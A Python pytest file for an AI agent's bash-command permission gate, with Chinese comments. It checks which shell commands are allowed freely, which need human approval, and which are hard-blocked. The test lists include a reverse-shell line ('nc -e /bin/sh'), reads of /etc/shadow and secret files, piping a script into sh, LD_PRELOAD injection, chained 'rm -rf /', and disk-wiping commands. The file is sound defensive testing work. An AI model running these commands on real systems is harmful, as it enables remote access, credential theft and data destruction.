from __future__ import annotations

from unittest.mock import AsyncMock

import pytest
from shed_core.hooks import ToolCallHook

from shed_agent.permissions import (
    CommandRule,
    PermissionGate,
    PermissionRequest,
    READONLY_TOOLS,
    analyze_bash_command,
    extract_flags_and_positionals,
)


@pytest.mark.anyio
async def test_permission_gate_readonly_tools_always_allowed():
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    for tool_name in ("read", "grep", "find", "ls"):
        hook = ToolCallHook(tool_call_id="c1", tool_name=tool_name, args={"path": "a.txt"})
        result = await gate(hook)
        assert result.block is False
    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_yolo_mode_allows_all():
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="yolo", confirm_callback=mock_cb)
    hook = ToolCallHook(
        tool_call_id="c2",
        tool_name="write",
        args={"path": "a.txt", "content": "123"},
    )
    result = await gate(hook)
    assert result.block is False
    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_autonomous_mode_allows_all():
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="autonomous", confirm_callback=mock_cb)
    hook = ToolCallHook(
        tool_call_id="c2_auto",
        tool_name="bash",
        args={"command": "rm -rf /"},
    )
    result = await gate(hook)
    assert result.block is False
    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_safe_bash_commands_allowed():
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    safe_cmds = [
        "git status",
        "git diff main",
        "git log -n 5",
        "pytest -q",
        "python -m pytest tests/",
        "uv run pytest",
    ]
    for cmd in safe_cmds:
        hook = ToolCallHook(tool_call_id="c_safe", tool_name="bash", args={"command": cmd})
        result = await gate(hook)
        assert result.block is False
    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_review_mode_prompts_write():
    captured_req: PermissionRequest | None = None

    async def cb(req: PermissionRequest) -> bool:
        nonlocal captured_req
        captured_req = req
        return True

    gate = PermissionGate(mode="review", confirm_callback=cb)
    hook = ToolCallHook(
        tool_call_id="c3",
        tool_name="write",
        args={"path": "a.txt", "content": "hello world"},
    )
    result = await gate(hook)
    assert result.block is False
    assert captured_req is not None
    assert captured_req.action == "write"
    assert captured_req.target == "a.txt"
    assert captured_req.preview == "hello world"
    assert captured_req.details == {"path": "a.txt", "content": "hello world"}


@pytest.mark.anyio
async def test_permission_gate_review_mode_prompts_edit():
    captured_req: PermissionRequest | None = None

    async def cb(req: PermissionRequest) -> bool:
        nonlocal captured_req
        captured_req = req
        return True

    gate = PermissionGate(mode="review", confirm_callback=cb)
    hook = ToolCallHook(
        tool_call_id="c3_edit",
        tool_name="edit",
        args={"path": "src/main.py", "edits": [{"oldText": "a", "newText": "b"}]},
    )
    result = await gate(hook)
    assert result.block is False
    assert captured_req is not None
    assert captured_req.action == "edit"
    assert captured_req.target == "src/main.py"
    assert captured_req.preview == "[{'oldText': 'a', 'newText': 'b'}]"


@pytest.mark.anyio
async def test_permission_gate_review_mode_prompts_unsafe_bash():
    mock_cb = AsyncMock(return_value=True)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)
    hook = ToolCallHook(
        tool_call_id="c_unsafe",
        tool_name="bash",
        args={"command": "rm -rf /tmp/test"},
    )
    result = await gate(hook)
    assert result.block is False
    mock_cb.assert_called_once()
    req = mock_cb.call_args[0][0]
    assert req.action == "bash"
    assert req.target == "rm -rf /tmp/test"


@pytest.mark.anyio
async def test_permission_gate_denial_blocks_tool():
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)
    hook = ToolCallHook(
        tool_call_id="c4",
        tool_name="write",
        args={"path": "a.txt", "content": "123"},
    )
    result = await gate(hook)
    assert result.block is True
    assert "用户拒绝了工具 [write] 的执行请求。" in (result.reason or "")


@pytest.mark.anyio
async def test_permission_gate_no_callback_allows_by_default():
    gate = PermissionGate(mode="review", confirm_callback=None)
    hook = ToolCallHook(
        tool_call_id="c5",
        tool_name="write",
        args={"path": "a.txt", "content": "123"},
    )
    result = await gate(hook)
    assert result.block is False


@pytest.mark.anyio
async def test_permission_gate_strict_mode_blocks_readonly_without_approval():
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="strict", confirm_callback=mock_cb)
    hook = ToolCallHook(
        tool_call_id="c6",
        tool_name="read",
        args={"path": "secret.txt"},
    )
    result = await gate(hook)
    assert result.block is True
    assert "用户拒绝了工具 [read] 的执行请求。" in (result.reason or "")
    mock_cb.assert_called_once()


@pytest.mark.anyio
async def test_permission_gate_sync_callback_supported():
    def sync_cb(req: PermissionRequest) -> bool:
        return False

    gate = PermissionGate(mode="review", confirm_callback=sync_cb)
    hook = ToolCallHook(
        tool_call_id="c7",
        tool_name="write",
        args={"path": "a.txt", "content": "123"},
    )
    result = await gate(hook)
    assert result.block is True
    assert "用户拒绝了工具 [write] 的执行请求。" in (result.reason or "")


@pytest.mark.anyio
async def test_permission_gate_blocks_chained_and_subshell_bash_in_review_mode():
    mock_cb = AsyncMock(return_value=True)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    unsafe_patterns = [
        "git status; rm -rf /",
        "git diff && cat /etc/passwd",
        "git log || whoami",
        "git status | grep secret",
        "pytest & nc -e /bin/sh 1.2.3.4",
        "git status\nrm -rf .",
        "git log $(cat secret.txt)",
        "git status `cat secret.txt`",
    ]
    for cmd in unsafe_patterns:
        mock_cb.reset_mock()
        hook = ToolCallHook(tool_call_id="c_subshell", tool_name="bash", args={"command": cmd})
        await gate(hook)
        mock_cb.assert_called_once()


# SRE 排障白名单、安全管道、交互阻塞阻断与 readonly 模式测试


@pytest.mark.anyio
async def test_permission_gate_kb_search_readonly_tool_allowed():
    """验证故障知识库 RAG 检索工具 kb_search 已纳入免批只读集合，strict 模式下仍需审批。"""
    assert "kb_search" in READONLY_TOOLS

    mock_cb = AsyncMock(return_value=False)
    for mode in ("review", "readonly"):
        gate = PermissionGate(mode=mode, confirm_callback=mock_cb)
        hook = ToolCallHook(tool_call_id="c_rag", tool_name="kb_search", args={"query": "Nginx 502 Bad Gateway"})
        result = await gate(hook)
        assert result.block is False
    mock_cb.assert_not_called()

    strict_gate = PermissionGate(mode="strict", confirm_callback=mock_cb)
    strict_res = await strict_gate(ToolCallHook(tool_call_id="c_rag_s", tool_name="kb_search", args={"query": "OOM"}))
    assert strict_res.block is True
    mock_cb.assert_called_once()


@pytest.mark.anyio
async def test_permission_gate_sre_diagnostic_probes_allowed():
    """验证常见 Linux、容器与 K8s 只读排障命令在 review 模式下免审批放行。"""
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    sre_probes = [
        "ps aux",
        "ps -ef",
        "top -bn1",
        "top -b -n 1 -H -p 1024",
        "top -n2 -b -d0.5",
        "df -h",
        "du -sh /var/log",
        "free -m",
        "uptime",
        "vmstat 1 3",
        "iostat -xz 1 2",
        "ss -tulnp",
        "netstat -tulnp",
        "ip addr",
        "ip -br link show",
        "ip route",
        "ping -c 4 8.8.8.8",
        "ping -w 5 1.1.1.1",
        "uname -a",
        "lscpu",
        "lsblk",
        "mount",
        "dmesg -T",
        "journalctl -u nginx -n 200 --no-pager",
        "systemctl status nginx",
        "systemctl is-active redis",
        "systemctl list-units --failed",
        "docker ps -a",
        "docker logs --tail 100 web-api",
        "docker stats --no-stream",
        "docker compose ps",
        "docker network ls",
        "kubectl get pods -n production -owide",
        "kubectl describe pod nginx-0 -n default",
        "kubectl logs nginx-0 --tail=100",
        "kubectl top nodes",
        "tail -n 100 /var/log/syslog",
        "tail -100 /var/log/messages",
        "sed -n '1,50p' /etc/nginx/nginx.conf",
        "find /var/log -name '*.log' -mtime -1",
    ]
    for cmd in sre_probes:
        hook = ToolCallHook(tool_call_id="c_sre", tool_name="bash", args={"command": cmd})
        result = await gate(hook)
        assert result.block is False, f"预期只读探针免批放行，实际被拦: {cmd}"

    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_safe_readonly_pipelines_allowed():
    """验证多段只读过滤管道及引号内特殊字符能够准确识别并免批放行。"""
    mock_cb = AsyncMock(return_value=False)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    safe_pipelines = [
        "journalctl -u nginx -n 200 | grep error",
        'journalctl -ufake-service -n 200 | grep -E "error|warn|crit" | tail -n 20',
        "ps aux | head -n 20",
        "ps aux | sort -rk 3 | head -n 15",
        "ss -tulnp | grep 8080 | wc -l",
        "cat /etc/passwd | cut -d: -f1 | sort | uniq",
        "dmesg -T | grep -i oom | tail -n 30",
        'grep "a>b;c|d" /var/log/app.log',
        'docker stats --no-stream --format "{{.Name}}: {{.CPUPerc}}" | head -n 10',
    ]
    for cmd in safe_pipelines:
        hook = ToolCallHook(tool_call_id="c_pipe", tool_name="bash", args={"command": cmd})
        result = await gate(hook)
        assert result.block is False, f"预期安全管道免批放行，实际被拦: {cmd}"

    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_unsafe_pipes_and_mutations_prompt_in_review():
    """验证含管道提权（xargs/tee/sh/awk）、重定向、原地修改或变更子命令在 review 下必须触发人工审批。"""
    mock_cb = AsyncMock(return_value=True)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    must_prompt_cmds = [
        # 管道提权与落盘逃逸
        "ps aux | xargs kill -9",
        "journalctl -u nginx -n 50 | tee /tmp/nginx.log",
        "cat install.sh | sh",
        "cat install.sh | bash",
        "ps aux | awk '{print $2}'",
        # 重定向（输出覆写、追加、输入重定向、文件描述符重定向）
        "ps aux > /tmp/procs.txt",
        "df -h >> /tmp/disk.txt",
        "cat < /etc/shadow",
        "journalctl -n 20 2>&1 | grep err",
        # 原地写盘 / 删除 / 清理参数
        "sed -i 's/worker_processes 1/worker_processes 4/' /etc/nginx/nginx.conf",
        "sed -i.bak 's/a/b/' app.conf",
        "find /var/log -name '*.gz' -delete",
        "find /tmp -type f -exec rm {} +",
        "sort -o /tmp/sorted.txt /tmp/raw.txt",
        "uniq /tmp/in.txt /tmp/out.txt",
        "journalctl --vacuum-size=500M",
        "dmesg -c",
        "date -s '2026-01-01 00:00:00'",
        # 状态变更子命令
        "systemctl restart nginx",
        "systemctl stop postgresql",
        "ip route del default",
        "ip addr add 10.0.0.2/24 dev eth0",
        "mount /dev/sdb1 /mnt",
        "docker stop web-api",
        "docker exec -it web-api /bin/sh",
        "kubectl delete pod nginx-0",
        "kubectl apply -f deploy.yaml",
        "python -c 'import os; os.system(\"id\")'",
        # 环境变量注入、相对路径伪造与 sudo 提权
        "LD_PRELOAD=/tmp/evil.so ps aux",
        "./ps aux",
        "/tmp/fake_bin/df -h",
        "sudo journalctl -u nginx -n 50",
        "git log ${SECRET_REF}",
    ]
    for cmd in must_prompt_cmds:
        mock_cb.reset_mock()
        hook = ToolCallHook(tool_call_id="c_ask", tool_name="bash", args={"command": cmd})
        result = await gate(hook)
        assert result.block is False
        assert mock_cb.call_count == 1, f"预期触发人工审批回调，但未触发: {cmd}"


@pytest.mark.anyio
async def test_permission_gate_blocks_interactive_hang_commands_immediately():
    """验证 top、vim、less、tail -f、持续 ping 等交互阻塞命令前置直接阻断并返回替代建议。"""
    mock_cb = AsyncMock(return_value=True)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    interactive_hang_cmds = [
        ("top", "top -bn1"),
        ("top -p 1234", "top -bn1"),
        ("top -b", "top -bn1"),
        ("top -n 1", "top -bn1"),
        ("htop", "top -bn1"),
        ("vim /etc/nginx/nginx.conf", "vim"),
        ("vi /etc/hosts", "vi"),
        ("nano app.py", "nano"),
        ("less /var/log/syslog", "head"),
        ("more /var/log/syslog", "head"),
        ("watch df -h", "watch"),
        ("tmux", "tmux"),
        ("screen", "screen"),
        ("tail -f /var/log/nginx/error.log", "tail -n 100"),
        ("tail -fn 100 /var/log/nginx/error.log", "tail -n 100"),
        ("tail --follow=name /var/log/app.log", "tail -n 100"),
        ("journalctl -u nginx -f", "journalctl"),
        ("dmesg -w", "dmesg"),
        ("ping 8.8.8.8", "ping -c 4"),
        ("ping -W 1 8.8.8.8", "ping -c 4"),
        ("docker stats", "--no-stream"),
        ("docker logs -f web-api", "--tail 100"),
        ("kubectl logs -f pod-0", "--tail=100"),
        ("kubectl get pods -w", "watch"),
        ("kubectl edit deployment web", "kubectl edit"),
        ("vmstat 1", "vmstat 1 3"),
        # 管道中混入流式阻塞或带 sudo 包装的交互命令同样前置硬阻断
        ("journalctl -u nginx -f | grep error", "journalctl"),
        ("sudo top", "top -bn1"),
        ("/usr/bin/vim /etc/hosts", "vim"),
    ]
    for cmd, expected_hint in interactive_hang_cmds:
        hook = ToolCallHook(tool_call_id="c_hang", tool_name="bash", args={"command": cmd})
        result = await gate(hook)
        assert result.block is True, f"预期前置硬阻断交互式挂起命令，但被放行: {cmd}"
        assert expected_hint in (result.reason or ""), f"阻断原因缺少纠偏提示 [{expected_hint}]: {result.reason}"

    # 前置阻断不应触发人工确认回调
    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_blocks_catastrophic_self_lockout_commands():
    """验证 iptables -F 自锁、rm -rf /、停机重启等高危命令在受控模式下直接硬阻断。"""
    mock_cb = AsyncMock(return_value=True)
    gate = PermissionGate(mode="review", confirm_callback=mock_cb)

    catastrophic_cmds = [
        "iptables -F",
        "iptables -t filter --flush",
        "sudo iptables -F",
        "ip6tables -F",
        "nft flush ruleset",
        "ufw disable",
        "rm -rf /",
        "rm -rf /*",
        "rm -rf /etc",
        "shutdown -h now",
        "reboot",
        "init 0",
        "kill -9 1",
        "kill -9 -1",
        "mkfs.ext4 /dev/sdb1",
        "dd if=/dev/zero of=/dev/sda bs=1M",
    ]
    for cmd in catastrophic_cmds:
        hook = ToolCallHook(tool_call_id="c_cat", tool_name="bash", args={"command": cmd})
        result = await gate(hook)
        assert result.block is True, f"预期硬阻断灾难性命令，但未阻断: {cmd}"
        assert result.reason

    mock_cb.assert_not_called()


@pytest.mark.anyio
async def test_permission_gate_readonly_mode_headless_triage():
    """验证无头排障 readonly 模式：无回调时放行只读工具与安全探针，硬阻断一切修改与未知操作。"""
    gate = PermissionGate(mode="readonly", confirm_callback=None)

    # 1. 只读工具（含 kb_search）直接放行
    for tool_name in ("read", "grep", "find", "ls", "kb_search"):
        res = await gate(ToolCallHook(tool_call_id="ro_ok_1", tool_name=tool_name, args={"path": "."}))
        assert res.block is False

    # 2. 安全 SRE 探针与只读管道直接放行
    for safe_cmd in ("journalctl -u nginx -n 200 | grep error", "top -bn1", "df -h", "ss -tulnp"):
        res = await gate(ToolCallHook(tool_call_id="ro_ok_2", tool_name="bash", args={"command": safe_cmd}))
        assert res.block is False

    # 3. 写工具、编辑工具及未知外部工具一律阻断（无回调时也不可放行）
    for write_tool in ("write", "edit", "mcp_cloud_delete_instance"):
        res = await gate(ToolCallHook(tool_call_id="ro_deny_1", tool_name=write_tool, args={"path": "a.txt"}))
        assert res.block is True
        assert "readonly" in (res.reason or "")

    # 4. 变更类、重定向或链式 Shell 命令一律硬阻断
    for unsafe_cmd in ("systemctl stop nginx", "rm -rf /tmp/test", "ps aux > /tmp/p.txt", "git status; id"):
        res = await gate(ToolCallHook(tool_call_id="ro_deny_2", tool_name="bash", args={"command": unsafe_cmd}))
        assert res.block is True
        assert "readonly" in (res.reason or "")

    # 5. 交互式挂起命令优先返回具体的自纠偏指引
    hang_res = await gate(ToolCallHook(tool_call_id="ro_hang", tool_name="bash", args={"command": "top"}))
    assert hang_res.block is True
    assert "top -bn1" in (hang_res.reason or "")


@pytest.mark.anyio
async def test_permission_gate_extra_command_rules_extension():
    """验证通过 extra_command_rules 扩展自定义只读诊断 CLI 规则。"""
    mock_cb = AsyncMock(return_value=False)
    custom_rules = {
        "sre-ctl": CommandRule(allowed_subcommands=frozenset({"inspect", "health"})),
    }
    gate = PermissionGate(mode="review", confirm_callback=mock_cb, extra_command_rules=custom_rules)

    ok_res = await gate(
        ToolCallHook(tool_call_id="ext_1", tool_name="bash", args={"command": "sre-ctl inspect --cluster prod | grep err"})
    )
    assert ok_res.block is False
    mock_cb.assert_not_called()

    deny_res = await gate(
        ToolCallHook(tool_call_id="ext_2", tool_name="bash", args={"command": "sre-ctl failover --cluster prod"})
    )
    assert deny_res.block is True
    mock_cb.assert_called_once()


def test_extract_flags_and_positionals_posix_edge_cases():
    """直接验证 POSIX 短选项簇解构器对粘连数值与带参短选项的精确处理。"""
    # top -bn1 -> 提取 -b 与 -n，遇到数字 1 停止拆分
    flags, pos = extract_flags_and_positionals(
        ["top", "-bn1", "-p", "42"],
        value_short_flags=frozenset({"-n", "-p"}),
    )
    assert flags == frozenset({"-b", "-n", "-p"})
    assert pos == ()

    # kubectl get pods -owide -> -o 为取值选项，不应将 wide 中的 w 误拆为 -w
    k_flags, k_pos = extract_flags_and_positionals(
        ["kubectl", "get", "pods", "-owide", "--watch=false"],
        value_short_flags=frozenset({"-o", "-n"}),
    )
    assert "-o" in k_flags
    assert "-w" not in k_flags
    assert "--watch" in k_flags
    assert k_pos == ("get", "pods")

    # "--" 选项终止符后的 "-f" 应视为位置参数而非选项标志
    g_flags, g_pos = extract_flags_and_positionals(["grep", "--", "-f", "app.log"])
    assert "-f" not in g_flags
    assert g_pos == ("-f", "app.log")

    # 未闭合引号触发 Fail-Closed 降级为 ask
    decision, reason = analyze_bash_command('journalctl -u "nginx')
    assert decision == "ask"
    assert reason is None
